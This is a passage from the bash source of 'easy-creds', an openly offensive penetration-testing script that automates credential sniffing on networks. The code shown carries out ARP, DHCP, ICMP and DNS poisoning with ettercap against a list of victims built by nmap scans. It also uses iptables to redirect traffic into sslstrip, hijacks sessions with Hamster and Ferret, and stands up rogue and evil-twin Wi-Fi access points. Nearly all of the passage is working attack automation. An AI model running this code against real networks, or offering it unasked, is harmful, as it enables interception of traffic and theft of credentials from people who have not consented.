#!/bin/bash

##################################################################################################################
# easy-creds is a simple bash script which makes sniffing networks for credentials a little easier.              #
#                                                                                                                #
# J0hnnyBrav0 (@Brav0hax) with help from al14s (@al14s) and Zero_Chaos                                           #
##################################################################################################################
# v3.8-dev Garden of New Jersey - rolling
#
# Copyright (C) 2013  Eric Milam
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public
# License as published by the Free Software Foundation; either version 2 of the License, or any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along with this program; if not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
##################################################################################################################
#
#Clear some variables
unset wireless
unset etterlaunch
unset offset
unset eviltwin
unset vercompare
unset dosattack
unset karmasploit
unset x
unset y

#Save the starting location path
location=${PWD}

#Create the log folder in PWD
if [ -z ${1} ]; then
	logfldr=${PWD}/easy-creds-$(date +%F-%H%M)
	mkdir -p ${logfldr}
else
	logfldr=${1}
fi

# Catch ctrl-c input from user
trap f_Quit 2

#
# MISCELLANEOUS FUNCTIONS
#
##################################################
f_isxrunning(){
# Check to see if X is running
if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
	isxrunning=
else
	isxrunning=1
fi

# Uncomment the following line to launch attacks in a screen session instead of an xterm window.
#unset isxrunning

if [ -z ${isxrunning} ]; then
	echo -e "\n\e[1;31m[-]\e[0m Your attack will be launched in screen\n"
	sleep 2
fi
}
##################################################
f_prereq_check(){
#This function will check for the necessary prereqs, all MUST be in $PATH to run properly
app_prereqs="screen radiusd hamster ferret sslstrip dsniff urlsnarf msfconsole airbase-ng airodump-ng hostapd mdk3 ipcalc asleap"
for apps in ${app_prereqs}; do
	if [ -z "$(find /usr/bin| grep ${apps})" ] && [ -z "$(find /usr/local/sbin/|grep ${apps})" ] && [ -z "$(find /usr/sbin/|grep ${apps})" ]; then
		echo -e "\e[1;31m[!]\e[0m Couldn't find ${apps}. If its installed please create a symbolic link in /usr/bin"
		prereq_error=1
	fi
done

if [ ! -z ${prereq_error} ]; then
		echo -e "\n\e[1;31m[!]\e[0m Some prereqs missing, functionality may be impaired. Review README file."
		sleep 10
fi
app_prereqs= #unset the variable
}
##################################################
f_xtermwindows(){
x="0"					# x offset value
y="0"					# y offset value
width="100"				# width value
height="7"				# height value
yoffset="120"			# y offset
}
##################################################
f_checkexit(){
if [ -z ${clean} ]; then
	f_Quit
else
	if [[ -z $(ls ${logfldr}) ]];then rm -rf ${logfldr}; fi
	rm -rf /tmp/ec &> /dev/null
	clear
	exit 2> /dev/null
fi
}
##################################################
f_Quit(){
echo -e "\n\e[1;34m[*]\e[0m Please standby while we clean up your mess...\n"
sleep 2
# The following will run regardless of attack selected
if [ -s /tmp/ec/tail.pid ]; then kill $(cat /tmp/ec/tail.pid); fi
if [ -s /tmp/ec/sslstrip.pid ]; then kill $(cat /tmp/ec/sslstrip.pid); fi
if [ ! -z "$(pidof hamster)" ]; then kill $(pidof hamster); fi
if [ ! -z "$(pidof ferret)" ]; then kill $(pidof ferret); fi
if [ ! -z "$(pidof ettercap)" ]; then kill $(pidof ettercap); fi
if [ ! -z "$(pidof urlsnarf)" ]; then kill $(pidof urlsnarf); fi
if [ ! -z "$(pidof dsniff)" ]; then kill $(pidof dsniff); fi
echo "0" > /proc/sys/net/ipv4/ip_forward

#if [ -z "$(ls ${logfldr})" ];then rm -rf ${logfldr}; fi #simple hack-fix for now
# The following will run for wireless AP attacks
if [ ! -z ${wireless} ]; then
	kill $(pidof airbase-ng)
	if [ -s /tmp/ec/sleep.pid ]; then kill $(cat /tmp/ec/sleep.pid); fi
	if [ -s /var/run/dhcpd.pid ]; then kill $(cat /var/run/dhcpd.pid); fi
	if [ -s /var/run/dhcp3-server/dhcpd.pid ]; then kill $(cat /var/run/dhcp3-server/dhcpd.pid); fi
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	airmon-ng stop ${MONMODE} &> /dev/null
fi
# The following will run for wireless AP DoS attacks
if [ ! -z ${dosattack} ] ; then
	if [ -s /tmp/ec/dosap.pid ]; then kill $(cat /tmp/ec/dosap.pid); fi
	airmon-ng stop ${dosmon} &> /dev/null
	airmon-ng stop ${airomon} &> /dev/null
fi
# The following will run for the Karmetasploit attack
if [ ! -z ${karmasploit} ] ; then
	kill $(cat /tmp/ec/ec-karma.pid) &> /dev/null
	kill $(cat /tmp/ec/ec-metasploit.pid) &> /dev/null
fi

# The following will run for wireless Free Radius attacks
if [ ! -z ${fra} ]; then
	kill $(pidof radiusd) &> /dev/null
	kill $(pidof hostapd) &> /dev/null
	if [ -s /tmp/ec/tshark.pid ]; then kill $(cat /tmp/ec/tshark.pid);fi
	echo "" > ${freeradiuslog}
fi
# Final portion to clean up and quit current attack or exit
if [ "${mainchoice}" == "5" ]; then
	clear
	rm -rf /tmp/ec
	exit 2> /dev/null
fi

rm -rf /tmp/ec
bash ${0} ${logfldr}
kill $$ 2> /dev/null
clean=1
}
##################################################
#
# PREREQ AND CONFIGURATION FUNCTIONS
#
##################################################
f_addtunnel(){
#Check differnet paths based on install
if [ -e /etc/default/isc-dhcp-server ]; then
	dhcp_tunnel_add=/etc/default/isc-dhcp-server
elif [ -e /etc/sysconfig/dhcpd ]; then
	dhcp_tunnel_add=/etc/sysconfig/dhcpd
elif [ -e /etc/default/dhcp3-server ]; then
	dhcp_tunnel_add=/etc/default/dhcp3-server
else
	echo -e "\e[1;31m[-]\e[0m I can't find the proper file. Ensure a dhcp server is installed."
	sleep 3
	f_prereqs
fi
if [ -z ${isxrunning} ];then
	nano ${dhcp_tunnel_add}
else
 	xterm -bg blue -fg white -geometry 90x25 -T "Add dhcpd Interface" -e nano ${dhcp_tunnel_add} &
fi
f_prereqs
}
##################################################
f_nanoetter(){
#ettercap source install
if [ -e /etc/ettercap/etter.conf ]; then
	etter_conf_path=/etc/ettercap/etter.conf
#ettercap repo package install
elif [ -e /etc/etter.conf ];then
	etter_conf_path=/etc/etter.conf
else
	echo -e "\e[1;31m[-]\e[0m I can't find the etter.conf file"
	sleep 3
	f_prereqs
fi
if [ -z ${isxrunning} ];then
	nano ${etter_conf_path}
else
	xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Etter Conf" -e nano ${etter_conf_path} &
fi
f_prereqs
}
##################################################
f_nanoetterdns(){
#ettercap source install
if [ -e /usr/local/share/ettercap/etter.dns ]; then
	etter_dns_path=/usr/local/share/ettercap/etter.dns
#ettercap repo package install
elif [ -e /usr/share/ettercap/etter.dns ];then
	etter_dns_path=/usr/share/ettercap/etter.dns
elif [ -e /etc/ettercap/etter.dns ];then
	etter_dns_path=/etc/ettercap/etter.dns
else
	echo -e "\n\e[1;31m[-]\e[0m I can't find the etter.dns file"
	sleep 3
	f_prereqs
fi
if [ -z ${isxrunning} ];then
	nano ${etter_dns_path}
else
	xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Etter DNS" -e nano ${etter_dns_path} &
fi
f_prereqs
}
##################################################
f_karmareqs(){
clear
f_Banner
echo -e "\e[1;34m[*]\e[0m Installing Karmetasploit Prerequisites, please standby.\n"
gem install activerecord
echo -e "\n\e[1;32m[+]\e[0m Finished installing Karmetasploit Prerequisites.\n"
sleep 3
f_prereqs
}
##################################################
f_msfupdate(){
clear
f_Banner
echo -e "\e[1;34m[*]\e[0m Updating the Metasploit Framework, please stand by.\n"
msfupdate
echo -e "\n\e[1;32m[+]\e[0m Finished updating the Metasploit Framework.\n"
sleep 3
f_prereqs
}
##################################################
f_aircrackupdate(){
clear
f_Banner
echo -e "\n\e[1;34m[*]\e[0m Updating aircrack-ng from SVN, please be patient..."
svn co http://svn.aircrack-ng.org/trunk/ /tmp/ec/aircrack-ng
cd /tmp/ec/aircrack-ng/
make && make install > /dev/null
echo -e "\n\e[1;32m[+]\e[0m Finished updating Aircrack.\n"
sleep 2
echo -e "\e[1;34m[*]\e[0m Updating airodump-ng OUI.\n"
bash airodump-ng-oui-update > /dev/null
echo -e "\e[1;32m[+]\e[0m Finished updating airodump-ng OUI.\n"
sleep 3
cd ${location}
f_prereqs
}
##################################################
f_howtos(){
xdg-open http://www.youtube.com/user/Brav0Hax/videos
f_prereqs
}
##################################################
f_pbs(){
xdg-open http://www.youtube.com/watch?v=OFzXaFbxDcM
f_mainmenu
}
##################################################
#
# POISONING ATTACK FUNCTIONS
#
##################################################
f_getvics(){
	read -p "Do you have a populated file of victims to use? [y/N]: " VICFILE
	if [ "$(echo ${VICFILE} | tr 'A-Z' 'a-z')" == "y" ]; then
		VICLIST=
		p=
		if [ -e /tmp/victims ]; then p="[/tmp/victims]"; fi
		while [ -z ${VICLIST} ]; do
			read -e -p "Path to the victim list file $p : " VICLIST
			if [ -z ${VICLIST} ] && [ -n ${p} ]; then VICLIST="/tmp/victims"; fi
		done
	else
		VICS=
		while [ -z ${VICS} ]; do read -p "IP address or range of IPs to poison (ettercap format): " VICS; done
	fi
	GW=
	p=$(route | grep default | awk '{print $2}')
	while [ -z ${GW} ]; do
	 read -p "IP address of the gateway [${p}] : " GW
	 if [ -z ${GW} ];then GW=${p}; fi
	done
	f_whichettercap
}
##################################################
f_whichettercap(){
	if [ "${VICFILE}" == "y" ]; then
	 case ${poisoningchoice} in
	   2) etterlaunch=1 ;;
	   3) etterlaunch=3 ;;
	   5) etterlaunch=8 ;;
	 esac
	else
	 case ${poisoningchoice} in
	   2) etterlaunch=2 ;;
	   3) etterlaunch=4 ;;
	   5) etterlaunch=9 ;;
	 esac
	fi
}
##################################################
f_HostScan(){
# ARP scan of segment with nmap and creates victim file in /tmp
clear
f_Banner
unset range
while [ -z "${range}" ]; do read -p "Enter your target network range (nmap format): " range; f_validaterange;done
echo -e "Performing an ARP scan to identify live devices - excluding our IPs.\n\nThis may take a bit."
#take our addresses out of the mix
myaddrs=$(printf "%s," $(ifconfig | grep "inet" | grep -v "127.0.0.1" | awk '{print $2}' | sed 's/addr://g'))
nmap -PR -n -sn ${range} --exclude ${myaddrs} -oN /tmp/ec/nmap.scan
grep -e report -e MAC /tmp/ec/nmap.scan | sed '{ N; s/\n/ /; s/Nmap scan report for //g; s/MAC Address: //g; s/ (.\+//g; s/$/ -/; }' > /tmp/victims
echo -e "\n\e[1;34m[*]\e[0m Your victim host list is at /tmp/victims."
echo -e "\e[1;31m[-]\e[0m Remember to remove any IPs that should not be poisoned! (HSRP Physical NICs)\n" 
read -p "Would you like to edit the victim host list? [y/N] : " yn
if [ $(echo ${yn} | tr 'A-Z' 'a-z') == "y" ]; then
	if [ -z ${isxrunning} ];then
		nano /tmp/victims
	else
		xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Victims List" -e nano /tmp/victims &
	fi
fi
f_poisoning
}
##################################################
f_validaterange(){
# added nmap format validation - use of subnets (ex. 192.168.0.0/24), stars (ex. 192.168.*.*), and split ranges (ex. 192.168.1.1-10,14) now accepted.
if [ -z $(echo "${range}" | grep -E '^((25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]{1}){1}([-,](25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]{1}){1}){0,}|\*)\.(((25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{0,1}[0-9]{1}){1}([-,](25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{0,1}[0-9]{1}){1}){0,}|\*)\.){2}((25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{0,1}[0-9]{1}){1}([-,](25[0-4]{1}|2[0-4]{1}[0-9]{1}|1[0-9]{2}|[1-9]{0,1}[0-9]{1}){1}){0,}|\*|([0]{1}\/(8|9|[1-2]{1}[0-9]{1}|30|31|32){1})){1}$' | grep -v -E '([-][0-9]{1,3}[-])|(([,-].*[/]|[/].*[,-])|([*].*[/]|[/].*[*]))') ]; then
	unset range
else
	range=$(echo ${range})
fi
}
##################################################
f_setup(){
echo -e "Network Interfaces:\n"
ifconfig | awk '/Link encap:Eth/ {print;getline;print}' | sed '{ N; s/\n/ /; s/Link en.*.HWaddr//g; s/ Bcast.*//g; s/UP.*.:1//g; s/inet addr/IP/g; }' | sed '$a\\n'

unset IFACE
while [ -z ${IFACE} ]; do
	read -p "Interface connected to the network (ex. eth0): " IFACE
done

echo -e "\n\e[1;34m[*]\e[0m Setting up iptables to handle traffic routing...\n"
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o ${IFACE} -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sleep 3
f_xtermwindows
}
##################################################
f_Standard(){
clear
f_Banner
f_setup
f_getvics
f_finalstage
f_mainmenu
}
##################################################
f_Oneway(){
clear
f_Banner
f_setup
f_getvics
f_finalstage
f_mainmenu
}
##################################################
f_DHCPPoison(){
clear
f_Banner
f_setup
etterlaunch=5

unset POOL
while [ -z "${POOL}" ]; do read -p "Pool of IP address to assign to your victims: " POOL;	done
unset MASK
while [ -z "${MASK}" ]; do read -p "Netmask to assign to your victims: " MASK; done
unset DNS
while [ -z "${DNS}" ]; do	read -p "DNS IP to assign to your victims: " DNS; done
f_finalstage
f_mainmenu
}
##################################################
f_DNSPoison(){
clear
f_Banner
f_setup
f_getvics
f_finalstage
f_mainmenu
}
##################################################
f_ICMPPoison(){
clear
f_Banner
f_setup
etterlaunch=6
unset GATEMAC
while [ -z "${GATEMAC}" ]; do read -p "MAC address of the gateway: " GATEMAC; done
unset GATEIP
while [ -z "${GATEIP}" ]; do read -p "IP address of the gateway: " GATEIP; done
f_finalstage
f_mainmenu
}
##################################################
f_sidejack(){
echo -e "\n\e[1;34m[*]\e[0m Starting Hamster & Ferret..."
cd ${logfldr}
screen -dmS SideJack -t Ferret bash -c "ferret -i ${IFACE}"
sleep 2
screen -S SideJack -X screen -t Hamster hamster
cd ${location}
sleep 2
echo -e "\n\e[1;34m[*]\e[0m Run browser and type http://hamster\n"
echo -e "\e[1;34m[*]\e[0m Don't forget to set the proxy to 127.0.0.1:1234"
sleep 5
}
##################################################
f_ecap(){
unset etter_conf_path
#ettercap source install
if [ -e /etc/ettercap/etter.conf ]; then
	etter_conf_path=/etc/ettercap/etter.conf
	#ettercap repo package install
elif [ -e /etc/etter.conf ];then
	etter_conf_path=/etc/etter.conf
fi

echo -e "\e[1;34m[*]\e[0m Launching ettercap, poisoning specified hosts."
y=$(($y+$yoffset))
case ${etterlaunch} in
	1) type="[arp:remote]"
	   c="ettercap -a ${etter_conf_path} -M arp:remote -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ //" ;;
	2) type="[arp:remote]"
	   c="ettercap -a ${etter_conf_path} -M arp:remote -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ /${VICS}/" ;;
	3) type="[arp:oneway]"
	   c="ettercap -a ${etter_conf_path} -M arp:oneway -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} // /${GW}/" ;;
	4) type="[arp:oneway]"
	   c="ettercap -a ${etter_conf_path} -M arp:oneway -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${VICS}/ /${GW}/" ;;
	5) type="[dhcp:${POOL}/${MASK}/${DNS}/]"
	   c="ettercap -a ${etter_conf_path} -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} -M dhcp:${POOL}/${MASK}/${DNS}/" ;;
	6) type="[icmp:${GATEMAC}/${GATEIP}]"
	   c="ettercap -a ${etter_conf_path} -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} -M icmp:${GATEMAC}/${GATEIP}" ;;
	7) type="[tunnel]"
	   c="ettercap -a ${etter_conf_path} -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${TUNIFACE} // //" ;;
	8) type="[dns_spoof:arp]"
	   c="ettercap -a ${etter_conf_path} -P dns_spoof -M arp -T -j ${VICLIST} -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ //" ;;
	9) type="[dns_spoof:arp]"
	   c="ettercap -a ${etter_conf_path} -P dns_spoof -M arp -T -q -l ${logfldr}/ettercap$(date +%F-%H%M) -i ${IFACE} /${GW}/ /${VICS}/" ;;
	esac

	if [ ! -z ${isxrunning} ]; then
	   xterm -geometry "${width}"x${height}-${x}+${y} -T "Ettercap - $type" -l -lf ${logfldr}/ettercap$(date +%F-%H%M).txt -bg white -fg black -e ${c} &
	else
	   screen -S easy-creds -X screen -t "Ettercap-$type" ${c}
	fi
	ecpid=$(pidof ettercap)
}
##################################################
#
# FAKE AP ATTACK FUNCTIONS
#
##################################################
f_fakeapAttack(){
wireless=1
offset=1
clear
f_Banner
f_xtermwindows

unset SIDEJACK
read -p "Would you like to include a sidejacking attack? [y/N]: " SIDEJACK
SIDEJACK="$(echo ${SIDEJACK} | tr 'A-Z' 'a-z')"
echo -e "Network Interfaces:\n"
ifconfig | awk '/Link encap:Eth/ {print;getline;print}' | sed '{ N; s/\n/ /; s/Link en.*.HWaddr//g; s/ Bcast.*//g; s/UP.*.:1//g; s/inet addr/IP/g; }' | sed '$a\\n'

unset IFACE
while [ -z "${IFACE}" ]; do read -p "Interface connected to the internet (ex. eth0): " IFACE; done
wirelesscheck=$(airmon-ng | grep 'wlan')
if [ ! -z "${wirelesscheck}" ]; then
	airmon-ng
else
	echo -e "\n\e[1;31m[-]\e[0m I can't find a wireless interface to display...continuing anyway\n"
	sleep 5
fi

unset WIFACE
while [ -z "${WIFACE}" ]; do read -p "Wireless interface name (ex. wlan0): " WIFACE; done
if [ "${eviltwin}" == "1" ]; then
	airmon-ng start ${WIFACE} &> /dev/null
else
	unset ESSID
	while [ -z "${ESSID}" ]; do read -p "ESSID you would like your rogue AP to be called, example FreeWiFi: " ESSID; done
	unset CHAN
	while [ -z "${CHAN}" ]; do read -p "Channel you would like to broadcast on: " CHAN; done
	airmon-ng start ${WIFACE} ${CHAN} &> /dev/null
fi
modprobe tun
echo -e "\n\e[1;34m[*]\e[0m Your interface has now been placed in Monitor Mode\n"
airmon-ng | grep mon | sed '$a\\n'
unset MONMODE
while [ -z "${MONMODE}" ]; do read -p "Enter your monitor enabled interface name, (ex: mon0): " MONMODE; done

if [ ! -z "$(find /usr/bin/ | grep macchanger)" ] || [ ! -z "$(find /usr/local/bin | grep macchanger)" ]; then
	f_macchanger
fi
unset TUNIFACE
while [ -z "${TUNIFACE}" ]; do read -p "Enter your tunnel interface, example at0: " TUNIFACE; done
read -p "Do you have a dhcpd.conf file to use? [y/N]: " DHCPFILE
DHCPFILE=$(echo ${DHCPFILE} | tr 'A-Z' 'a-z')
if [ "${DHCPFILE}" == "y" ]; then
	f_dhcpconf
else
	f_dhcpmanual
fi

f_dhcptunnel
}
##################################################
f_macchanger(){
unset macvar
read -p "Would you like to change your MAC address on the mon interface? [y/N]: " macvar
mac_answer=$(echo ${macvar} | tr '[:upper:]' '[:lower:]')

unset random_mac
unset ap_mac
if [ "${mac_answer}" == "y" ]; then
	while [ -z "${random_mac}" ]; do read -p "Would like to have a random MAC address generated or manually input? [r/m]: " random_mac; done
	case ${random_mac} in
		r|R) ifconfig ${MONMODE} down && macchanger -A ${MONMODE} && ifconfig ${MONMODE} up;;
		m|M) while [ -z "${ap_mac}" ];do read -p "Desired MAC address for ${MONMODE}?: " ap_mac;done ; f_mac_manual ;;
		*) unset random_mac
	esac
		sleep 2
fi
}
##################################################
f_mac_manual(){

if [ -z $(echo ${ap_mac} | sed -n "/^\([0-9A-Z][0-9A-Z]:\)\{5\}[0-9A-Z][0-9A-Z]$/p") ]; then
	echo -e "\n\e[1;31m[-]\e[0m Invalid MAC address format"
	sleep 2
	f_macchanger
else
	ifconfig ${MONMODE} down && macchanger -m ${ap_mac} ${MONMODE} && ifconfig ${MONMODE} up
fi

}
##################################################
f_dhcpconf(){
unset dhcpdconf
if [ -e /etc/dhcp3/dhcpd.conf ]; then #Ubuntu/Debian dhcp3-server
	dhcpdconf="/etc/dhcp3/dhcpd.conf"
elif [ -e /etc/dhcpd.conf ]; then #redhat/fedora old
	dhcpdconf="/etc/dhcpd.conf"
else
	dhcpdconf="/etc/dhcp/dhcpd.conf" #Ubuntu/Debian/RH/Fedora isc-dhcp-server
fi
unset valid
while [[ ${valid} != 1 ]]; do
	read -e -p "Path to the dhcpd.conf file [$dhcpdconf]: " DHCPPATH
	if [ -z "${DHCPPATH}" ]; then DHCPPATH=${dhcpdconf}; fi
	if [ ! -f "${DHCPPATH}" ]; then
		echo -e "File not found - ${DHCPPATH}\n"
	else
		valid=1
	fi
done
cat ${DHCPPATH} > /tmp/ec/dhcpd.conf
mv /tmp/ec/dhcpd.conf ${dhcpdconf}
DHCPPATH=${dhcpdconf}
#If your DHCP conf file is setup properly, this will work, otherwise you need to tweak it
ATNET=$(cat ${DHCPPATH} |grep -i subnet|cut -d" " -f2)
ATIP=$(cat ${DHCPPATH} |grep -i "option routers"|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
ATSUB=$(cat ${DHCPPATH} |grep -i subnet|cut -d" " -f4)
ATCIDR=$(ipcalc -b ${ATNET}/${ATSUB}|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\/[0-9]\{1,2\}')
}
##################################################
f_ipcalc(){
	unset dhcpdconf
	if [ -e /etc/dhcp3/dhcpd.conf ]; then
		dhcpdconf="/etc/dhcp3/dhcpd.conf"
	elif [ -e /etc/sysconfig/dhcpd ]; then
		dhcpdconf="/etc/dhcpd.conf"
	else
		dhcpdconf="/etc/dhcp/dhcpd.conf"
	fi

	DHCPPATH=${dhcpdconf}

	#use ipcalc to complete the DHCP setup
	ipcalc "${ATCIDR}" > /tmp/ec/atcidr
	ATNET=$(cat /tmp/ec/atcidr|grep Address| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
	ATIP=$(cat /tmp/ec/atcidr|grep HostMin| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
	ATSUB=$(cat /tmp/ec/atcidr|grep Netmask| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
	ATBROAD=$(cat /tmp/ec/atcidr|grep Broadcast| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
	ATLSTARTTMP=$(cat /tmp/ec/atcidr|grep HostMin| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|cut -d"." -f1-3)
	ATLSTART=$(echo ${ATLSTARTTMP}.100)
	ATLENDTMP=$(cat /tmp/ec/atcidr|grep HostMax| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|cut -d"." -f1-3)
	ATLEND=$(echo ${ATLENDTMP}.200)

	echo -e "\n\e[1;34m[*]\e[0m Creating a dhcpd.conf to assign addresses to clients that connect to us."

	cat <<-EOF > ${DHCPPATH}
		ddns-update-style none;
		authoritative;
		log-facility local7;
		subnet ${ATNET} netmask ${ATSUB} {
			range ${ATLSTART} ${ATLEND};
			option domain-name-servers ${ATDNS};
			option routers ${ATIP};
			option broadcast-address ${ATBROAD};
			default-lease-time 600;
			max-lease-time 7200;
		}
	EOF
}
##################################################
f_dhcpmanual(){
unset ATCIDR
while [ -z "${ATCIDR}" ]; do
	read -p "Network range for your tunneled interface, example 10.0.0.0/24: " ATCIDR
	if [[ ! ${ATCIDR} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,2}$ ]]; then ATCIDR=; fi
done
unset ATDNS
cat /etc/resolv.conf |grep nameserver|cut -d " " -f2 >/tmp/ec/name_servers.lst
if [ -s /tmp/ec/name_servers.lst ]; then
	echo
	echo "The following DNS server IPs were found in your /etc/resolv.conf file: "
	for ips in $(cat /tmp/ec/name_servers.lst); do
		echo -n " <> " && echo ${ips}
	done
	echo
fi
while [ -z "${ATDNS}" ]; do read -p "Enter the IP address for the DNS server, example 8.8.8.8: " ATDNS
	if [[ ! ${ATDNS} =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then ATDNS=; fi
done
f_ipcalc
}
##################################################
f_dhcptunnel(){
	etterlaunch=7
	# airbase-ng is going to create our fake AP with the SSID we specified
	echo -e "\e[1;34m[*]\e[0m Launching Airbase with your settings."

	if [ "${eviltwin}" == "1" ] && [ -z ${isxrunning} ]; then
	  screen -dmS easy-creds -t Airbase-NG airbase-ng -P -C 30 -e "${ESSID}" -v ${MONMODE}
	elif [ "${eviltwin}" == "1" ] && [ ! -z ${isxrunning} ]; then
	  xterm -geometry "${width}"x${height}-${x}+${y} -T "Airbase-NG" -e airbase-ng -P -C 30 -e "${ESSID}" -v ${MONMODE} &
	elif [ -z ${isxrunning} ]; then
	  screen -dmS easy-creds -t Airbasg-NG airbase-ng -e "${ESSID}" -c "${CHAN}" ${MONMODE}
	else
	  xterm -geometry ${width}x${height}-${x}+${y} -T "Airbase-NG" -e airbase-ng -e "${ESSID}" -c "${CHAN}" ${MONMODE} &
	fi
	sleep 7

	echo -e "\e[1;34m[*]\e[0m Configuring tunneled interface."
	ifconfig "${TUNIFACE}" up
	ifconfig "${TUNIFACE}" "${ATIP}" netmask "${ATSUB}"
	ifconfig "${TUNIFACE}" mtu 1500
	route add -net "${ATNET}" netmask "${ATSUB}" gw "${ATIP}" dev "${TUNIFACE}"
	sleep 2

	echo -e "\e[1;34m[*]\e[0m Setting up iptables to handle traffic seen by the tunneled interface."
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT
	iptables -t nat -A POSTROUTING -o ${IFACE} -j MASQUERADE
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	sleep 2

	echo -e "\e[1;34m[*]\e[0m Launching Tail."
	if [ -z ${isxrunning} ]; then
	 screen -S easy-creds -X screen -t DMESG tail -f /var/log/messages
	else
	 y=$((${y}+${yoffset}))
	 xterm -geometry "${width}"x${height}-${x}+${y} -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &
	fi
	sleep 2

	#Get the PID so we can kill it when the user quits the attack
	ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/tail.pid
	if [ -z "$(cat /tmp/ec/tail.pid)" ]; then ps ax|grep tail|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/tail.pid; fi
	echo -e "\e[1;34m[*]\e[0m DHCP server starting on tunneled interface."
	if [ -e /etc/dhcp3/dhcpd.conf ]; then
		dhcpd3 -q -cf ${DHCPPATH} -pf /var/run/dhcp3-server/dhcpd.pid ${TUNIFACE} &
	elif [ -e /etc/sysconfig/dhcpd ]; then
		systemctl start dhcpd.service
	else
		service isc-dhcp-server start
	fi

	sleep 2
	f_finalstage
	f_mainmenu
}
##################################################
f_finalstage(){
if [ -z ${wireless} ]; then
	read -p "Would you like to include a sidejacking attack? [y/N]: " SIDEJACK
	SIDEJACK="$(echo ${SIDEJACK} | tr 'A-Z' 'a-z')"
fi
if [ "${etterlaunch}" -lt "8" ];then
	echo -e "\e[1;34m[*]\e[0m Launching SSLStrip..."
	sslstripfilename=sslstrip$(date +%F-%H%M).log
	if [ "${wireless}" == "1" ] && [ -z ${isxrunning} ]; then
		screen -S easy-creds -X screen -t sslstrip sslstrip -pfk -w ${logfldr}/${sslstripfilename}
	elif [ -z ${wireless} ] && [ -z ${isxrunning} ]; then
		screen -dmS easy-creds -t sslstrip sslstrip -pfk -w ${logfldr}/${sslstripfilename}
	elif [ "$offset" == "1" ]; then
		y=$((${y}+${yoffset}))
		xterm -geometry "${width}"x${height}-${x}+${y} -bg blue -fg white -T "SSLStrip" -e sslstrip -pfk -w ${logfldr}/${sslstripfilename} &
	else
		xterm -geometry "${width}"x${height}-${x}+${y} -bg blue -fg white -T "SSLStrip" -e sslstrip -pfk -w ${logfldr}/${sslstripfilename} &
	fi
fi
sleep 2
#Get the PID so we can kill it when the user quits the attack
ps ax|grep sslstrip|grep -v grep|grep -v xterm|cut -d " " -f1 > /tmp/ec/sslstrip.pid
if [ -z $(cat /tmp/ec/sslstrip.pid) ]; then ps ax|grep sslstrip|grep -v grep|grep -v xterm|cut -d " " -f2 > /tmp/ec/sslstrip.pid; fi
#Launch ettercap
f_ecap
sleep 3
echo -e "\e[1;34m[*]\e[0m Configuring IP forwarding..."
echo "1" > /proc/sys/net/ipv4/ip_forward
sleep 3
echo -e "\e[1;34m[*]\e[0m Launching URLSnarf..."
if [ "${wireless}" == "1" ] && [ -z ${isxrunning} ]; then
	screen -S easy-creds -X screen -t URL-Snarf urlsnarf -i ${TUNIFACE}
	screen -S easy-creds -p urlsnarf -X logfile ${logfldr}/urlsnarf-$(date +%F-%H%M).txt
	screen -S easy-creds -p urlsnarf -X log
elif [ "${wireless}" == "1" ]; then
